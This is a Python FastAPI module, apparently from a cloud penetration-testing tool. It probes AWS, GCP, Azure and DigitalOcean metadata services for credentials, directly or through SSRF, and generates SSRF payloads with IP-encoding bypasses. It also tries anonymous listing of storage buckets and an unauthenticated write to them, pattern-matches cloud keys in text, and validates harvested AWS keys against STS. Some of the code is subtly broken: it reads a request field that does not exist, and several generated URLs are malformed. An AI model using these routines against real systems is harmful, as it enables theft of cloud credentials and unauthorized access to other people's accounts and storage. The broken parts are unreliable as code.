"""
Cloud Tester — IMDS probing, S3/GCS/Azure bucket auditing, credential scanning & validation.

Endpoints:
  POST /cloud/imds/probe          — probe IMDS endpoints (AWS/GCP/Azure/DO)
  POST /cloud/ssrf/generate       — generate SSRF payloads targeting cloud metadata
  POST /cloud/bucket/check        — check S3/GCS/Azure bucket access
  POST /cloud/creds/scan          — extract cloud credential patterns from text
  POST /cloud/creds/validate      — validate AWS key via sts:GetCallerIdentity
"""

import re

import httpx
import structlog
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

logger = structlog.get_logger()
router = APIRouter()

# ── Schemas ────────────────────────────────────────────────────────────────

class IMDSProbeRequest(BaseModel):
    target: str | None = None      # direct IMDS host or SSRF URL
    providers: list[str] = ["aws", "gcp", "azure", "do"]
    ssrf_param: str | None = None  # e.g. "url" for ?url=<imds>

class SSRFPayloadRequest(BaseModel):
    callback_url: str = ""
    providers: list[str] = ["aws", "gcp", "azure", "do"]

class BucketCheckRequest(BaseModel):
    bucket_name: str
    provider: str = "aws"          # aws | gcp | azure
    access_key: str | None = None
    secret_key: str | None = None
    region: str = "us-east-1"

class CredScanRequest(BaseModel):
    text: str

class CredValidateRequest(BaseModel):
    access_key: str
    secret_key: str
    session_token: str | None = None


# ── IMDS endpoints ─────────────────────────────────────────────────────────

IMDS_ENDPOINTS = {
    "aws": [
        ("Latest Metadata Root", "http://169.254.169.254/latest/meta-data/"),
        ("IAM Role Credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("Instance Identity",    "http://169.254.169.254/latest/dynamic/instance-identity/document"),
        ("User Data",            "http://169.254.169.254/latest/user-data"),
        ("IMDSv2 Token",         "http://169.254.169.254/latest/api/token"),
    ],
    "gcp": [
        ("Project Info",    "http://metadata.google.internal/computeMetadata/v1/project/?recursive=true"),
        ("Service Accounts","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"),
        ("Access Token",    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
        ("Instance Info",   "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true"),
    ],
    "azure": [
        ("Instance Metadata","http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("Access Token",     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ],
    "do": [
        ("Metadata", "http://169.254.169.254/metadata/v1/"),
        ("Hostname", "http://169.254.169.254/metadata/v1/hostname"),
    ],
}

IMDS_HEADERS = {
    "aws":   {},
    "gcp":   {"Metadata-Flavor": "Google"},
    "azure": {"Metadata": "true"},
    "do":    {},
}

CRED_FIELDS = re.compile(
    r"(AccessKeyId|SecretAccessKey|Token|access_token|expires_in|"
    r"accountId|projectId|client_id|principalId|subscriptionId)",
    re.IGNORECASE,
)


async def _probe_endpoint(url: str, headers: dict, timeout: float = 5.0) -> dict:
    try:
        async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=False) as client:
            resp = await client.get(url, headers=headers)
            body = resp.text[:2000]
            sensitive = bool(CRED_FIELDS.search(body))
            return {
                "url":       url,
                "status":    resp.status_code,
                "reachable": True,
                "sensitive": sensitive,
                "body":      body,
            }
    except httpx.TimeoutException:
        return {"url": url, "reachable": False, "error": "timeout"}
    except Exception as e:
        return {"url": url, "reachable": False, "error": str(e)}


# ── Routes ─────────────────────────────────────────────────────────────────

@router.post("/imds/probe", summary="Probe cloud metadata service endpoints")
async def imds_probe(req: IMDSProbeRequest):
    results = {}
    for provider in req.providers:
        endpoints = IMDS_ENDPOINTS.get(provider, [])
        if not endpoints:
            continue
        hdrs = IMDS_HEADERS.get(provider, {})
        provider_results = []
        for label, url in endpoints:
            if req.target:
                # SSRF mode: replace 169.254.x.x / metadata.google.internal with target
                probed_url = url.replace("169.254.169.254", req.target).replace("metadata.google.internal", req.target)
            else:
                probed_url = url
            result = await _probe_endpoint(probed_url, hdrs)
            result["label"] = label
            provider_results.append(result)
        results[provider] = provider_results

    reachable_count = sum(
        1 for provider_res in results.values()
        for r in provider_res if r.get("reachable")
    )
    sensitive_count = sum(
        1 for provider_res in results.values()
        for r in provider_res if r.get("sensitive")
    )
    return {
        "target":          req.target,
        "reachable_count": reachable_count,
        "sensitive_count": sensitive_count,
        "providers":       results,
    }


@router.post("/ssrf/generate", summary="Generate SSRF payloads for cloud IMDS")
async def ssrf_generate(req: SSRFPayloadRequest):
    payloads = {}
    for provider in req.providers:
        endpoints = IMDS_ENDPOINTS.get(provider, [])
        if not endpoints:
            continue
        base_url = endpoints[0][1]
        variants = [
            base_url,
            base_url.replace("http://", "http://0177.0.0.01/").replace("169.254.169.254", "0177.0.0.01"),
            base_url.replace("169.254.169.254", "169.254.169.254.nip.io"),
            base_url.replace("169.254.169.254", "[::ffff:169.254.169.254]"),
            base_url.replace("http://", "http://[0:0:0:0:0:ffff:a9fe:a9fe]/").replace("169.254.169.254", ""),
        ]
        # URL-encoded variants
        encoded = [
            base_url.replace("169.254.169.254", "169%2E254%2E169%2E254"),
            base_url.replace("169.254.169.254", "%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34"),
        ]
        if req.callback_url:
            wrapped = [f"{req.callback_url}?{req.ssrf_param or 'url'}={v}" for v in variants[:3]]
        else:
            wrapped = variants

        payloads[provider] = {
            "direct":   variants,
            "encoded":  encoded,
            "wrapped":  wrapped if req.callback_url else [],
            "headers":  IMDS_HEADERS.get(provider, {}),
        }
    return {"payloads": payloads}


@router.post("/bucket/check", summary="Check S3/GCS/Azure bucket permissions")
async def bucket_check(req: BucketCheckRequest):
    bucket    = req.bucket_name.strip()
    provider  = req.provider.lower()
    checks    = []

    if provider == "aws":
        base = f"https://{bucket}.s3.{req.region}.amazonaws.com"
        # Unauthenticated listing
        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                list_resp = await client.get(f"{base}/?list-type=2&max-keys=5")
                if list_resp.status_code == 200 and "<ListBucketResult" in list_resp.text:
                    checks.append({"check": "Public ListObjects", "status": "VULNERABLE", "detail": f"Bucket is publicly listable — {list_resp.text.count('<Key>')} keys visible"})
                elif list_resp.status_code == 403:
                    checks.append({"check": "Public ListObjects", "status": "SECURE", "detail": "403 Forbidden — listing denied"})
                elif list_resp.status_code == 404:
                    checks.append({"check": "Bucket Exists", "status": "INFO", "detail": "404 — bucket not found or private"})
                else:
                    checks.append({"check": "Public ListObjects", "status": "INFO", "detail": f"HTTP {list_resp.status_code}"})
        except Exception as e:
            checks.append({"check": "Public ListObjects", "status": "ERROR", "detail": str(e)})

        # Try PUT (write test — using a test key name that is highly unlikely to exist)
        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                put_resp = await client.put(f"{base}/blujay-writetest.txt", content=b"test")
                if put_resp.status_code in (200, 204):
                    checks.append({"check": "Public Write (PUT)", "status": "CRITICAL", "detail": "Bucket is publicly writable!"})
                else:
                    checks.append({"check": "Public Write (PUT)", "status": "SECURE", "detail": f"HTTP {put_resp.status_code} — write denied"})
        except Exception as e:
            checks.append({"check": "Public Write (PUT)", "status": "ERROR", "detail": str(e)})

    elif provider == "gcp":
        base = f"https://storage.googleapis.com/{bucket}"
        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                resp = await client.get(f"{base}?prefix=&maxResults=5")
                if resp.status_code == 200 and "items" in resp.text:
                    checks.append({"check": "Public ListObjects (GCS)", "status": "VULNERABLE", "detail": "GCS bucket is publicly listable"})
                elif resp.status_code == 403:
                    checks.append({"check": "Public ListObjects (GCS)", "status": "SECURE", "detail": "403 — access denied"})
                else:
                    checks.append({"check": "Public ListObjects (GCS)", "status": "INFO", "detail": f"HTTP {resp.status_code}"})
        except Exception as e:
            checks.append({"check": "Public ListObjects (GCS)", "status": "ERROR", "detail": str(e)})

    elif provider == "azure":
        # Azure blob storage: <account>.blob.core.windows.net/<container>
        parts = bucket.split("/", 1)
        account   = parts[0]
        container = parts[1] if len(parts) > 1 else "$web"
        base = f"https://{account}.blob.core.windows.net/{container}"
        try:
            async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
                resp = await client.get(f"{base}?restype=container&comp=list")
                if resp.status_code == 200 and "<EnumerationResults" in resp.text:
                    checks.append({"check": "Public ListBlobs (Azure)", "status": "VULNERABLE", "detail": "Azure container is publicly listable"})
                elif resp.status_code == 403:
                    checks.append({"check": "Public ListBlobs (Azure)", "status": "SECURE", "detail": "403 — access denied"})
                else:
                    checks.append({"check": "Public ListBlobs (Azure)", "status": "INFO", "detail": f"HTTP {resp.status_code}"})
        except Exception as e:
            checks.append({"check": "Public ListBlobs (Azure)", "status": "ERROR", "detail": str(e)})

    return {"bucket": bucket, "provider": provider, "checks": checks}


# ── Credential patterns ────────────────────────────────────────────────────

CRED_PATTERNS = [
    {
        "name":       "AWS Access Key",
        "regex":      r"(?<![A-Z0-9])(AKIA|ABIA|ACCA|AGPA|AIDA|AIPA|ANPA|ANVA|AROA|ASCA|ASIA)[A-Z0-9]{16}(?![A-Z0-9])",
        "type":       "aws_access_key",
        "confidence": "HIGH",
    },
    {
        "name":       "AWS Secret Key",
        "regex":      r"(?i)(?:aws.{0,20})?(?:secret.{0,10})?['\"]?([A-Za-z0-9+/]{40})['\"]?",
        "type":       "aws_secret_key",
        "confidence": "MEDIUM",
    },
    {
        "name":       "GCP Service Account Key",
        "regex":      r'"private_key_id"\s*:\s*"([A-Fa-f0-9]{40})"',
        "type":       "gcp_service_account",
        "confidence": "HIGH",
    },
    {
        "name":       "Azure Connection String",
        "regex":      r"DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]+",
        "type":       "azure_connection_string",
        "confidence": "HIGH",
    },
    {
        "name":       "Azure SAS Token",
        "regex":      r"(?i)sv=\d{4}-\d{2}-\d{2}&s[a-z]=",
        "type":       "azure_sas_token",
        "confidence": "MEDIUM",
    },
    {
        "name":       "Generic API Key",
        "regex":      r'(?i)(?:api.key|apikey|api_token|auth.token)["\s:=]+([A-Za-z0-9_\-]{20,64})',
        "type":       "generic_api_key",
        "confidence": "LOW",
    },
]


def _redact(value: str) -> str:
    if len(value) <= 8:
        return "***"
    return value[:4] + "***" + value[-4:]


@router.post("/creds/scan", summary="Scan text for cloud credential patterns")
async def creds_scan(req: CredScanRequest):
    findings = []
    for pattern in CRED_PATTERNS:
        matches = list(re.finditer(pattern["regex"], req.text))
        for m in matches:
            value = m.group(0) if not m.lastindex else m.group(m.lastindex)
            findings.append({
                "type":       pattern["type"],
                "name":       pattern["name"],
                "confidence": pattern["confidence"],
                "redacted":   _redact(value),
                "length":     len(value),
                "offset":     m.start(),
                "line":       req.text[:m.start()].count("\n") + 1,
            })
    findings.sort(key=lambda f: {"HIGH": 0, "MEDIUM": 1, "LOW": 2}.get(f["confidence"], 3))
    return {"total": len(findings), "findings": findings}


@router.post("/creds/validate", summary="Validate AWS credentials via sts:GetCallerIdentity")
async def creds_validate(req: CredValidateRequest):
    try:
        import boto3  # type: ignore
        session = boto3.Session(
            aws_access_key_id=req.access_key,
            aws_secret_access_key=req.secret_key,
            aws_session_token=req.session_token,
        )
        sts = session.client("sts")
        identity = sts.get_caller_identity()
        return {
            "valid":   True,
            "account": identity.get("Account"),
            "arn":     identity.get("Arn"),
            "user_id": identity.get("UserId"),
        }
    except ImportError:
        raise HTTPException(503, "boto3 not installed — pip install boto3")
    except Exception as e:
        err_msg = str(e)
        if "InvalidClientTokenId" in err_msg or "InvalidClientToken" in err_msg:
            return {"valid": False, "error": "Invalid access key ID"}
        if "SignatureDoesNotMatch" in err_msg:
            return {"valid": False, "error": "Secret key is incorrect"}
        if "ExpiredToken" in err_msg:
            return {"valid": False, "error": "Session token has expired"}
        return {"valid": False, "error": err_msg}
